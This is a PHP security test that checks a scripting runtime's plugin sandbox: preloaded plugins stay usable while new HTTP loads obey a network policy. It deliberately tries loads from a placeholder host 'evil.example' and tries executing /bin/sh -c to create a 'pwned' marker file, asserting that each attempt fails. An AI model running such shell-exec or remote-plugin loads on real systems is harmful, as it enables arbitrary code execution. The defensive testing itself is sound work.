<?php

// Proves the combined scenario neither test_security_plugins.php nor
// test_security_plugins_http.php covers alone: plugins preloaded at startup
// (SCRIPTLING_PLUGIN_DIR) stay fully usable *at the same time* scripts are
// allowed to attempt loading new HTTP(S) plugins under the network policy
// (SCRIPTLING_PLUGIN_HTTP_ENABLED=true). Run via
// `make test-security-plugins-combined`, which sets:
//   SCRIPTLING_ENABLED_LIBRARIES=scriptling.plugin
//   SCRIPTLING_PLUGIN_DIR=/app/tests/fixtures/plugins
//   SCRIPTLING_PLUGIN_HTTP_ENABLED=true
//   SCRIPTLING_NETWORK_POLICY_FILE=.../permissive-ip-literals-policy.toml,.../deny-hosts-network-policy.toml

$pass = 0;
$fail = 0;
$errors = [];

function assert_true($test, $label) {
    global $pass, $fail, $errors;
    if ($test === true) { $pass++; } else { $fail++; $errors[] = "FAIL $label: got " . var_export($test, true); }
}

function assert_contains($haystack, $needle, $label) {
    global $pass, $fail, $errors;
    if (str_contains($haystack, $needle)) { $pass++; }
    else { $fail++; $errors[] = "FAIL $label: expected '$needle' in '$haystack'"; }
}

$vm = new Scriptling();

echo "=== Plugins: startup preload + HTTP-only new loading, combined ===\n";

$vm->eval("import scriptling.plugin as plugin");
assert_true(!$vm->hasError(), "plugins-combined: scriptling.plugin imports");

// The startup-preloaded plugin is fully usable.
$vm->clearError();
$callResult = $vm->eval('plugin.call_function("frankenscriptling-test-plugin", "greet", "combined")');
assert_true(!$vm->hasError(), "plugins-combined: the startup-preloaded plugin's call_function works");
assert_contains($callResult, "hello, combined", "plugins-combined: and returns the real result");

// A new HTTP(S) load the policy denies still fails, exactly as it would
// with no preloaded plugin at all.
$vm->clearError();
$vm->eval('plugin.load("evil", "http://127.0.0.1:9/", scriptling=True)');
assert_true($vm->hasError(), "plugins-combined: a policy-denied new load still fails");
assert_contains($vm->getLastError(), "network policy", "plugins-combined: denial reports a network-policy error");

$vm->clearError();
$vm->eval('plugin.load("evil2", "https://evil.example/rpc", scriptling=True)');
assert_true($vm->hasError(), "plugins-combined: deny_hosts still wins for a new load alongside the preloaded plugin");

// Stdio/exec loading is still impossible even though the preloaded plugin
// itself is a stdio executable.
@unlink("/tmp/frankenscriptling-plugin-combined-pwned");
$vm->clearError();
$vm->eval('plugin.load("evil3", "/bin/sh", args=["-c", "touch /tmp/frankenscriptling-plugin-combined-pwned"])');
assert_true($vm->hasError(), "plugins-combined: stdio/exec loading still fails");
assert_true(!file_exists("/tmp/frankenscriptling-plugin-combined-pwned"), "plugins-combined: the arbitrary executable never ran");

// The preloaded plugin can still never be unloaded, and is still usable
// after the attempt.
$vm->clearError();
$vm->eval('plugin.unload("frankenscriptling-test-plugin")');
assert_true($vm->hasError(), "plugins-combined: unload() of the preloaded plugin still fails");

$vm->clearError();
$stillWorks = $vm->eval('plugin.call_function("frankenscriptling-test-plugin", "greet", "still-here")');
assert_true(!$vm->hasError(), "plugins-combined: the preloaded plugin is still callable after everything above");
assert_contains($stillWorks, "hello, still-here", "plugins-combined: and still returns real results");

echo "\n" . str_repeat("=", 50) . "\n";
echo "Results: $pass passed, $fail failed\n";
if ($fail > 0) {
    echo "\nFailures:\n";
    foreach ($errors as $e) { echo "  $e\n"; }
    exit(1);
}
echo "All tests passed!\n";
exit(0);
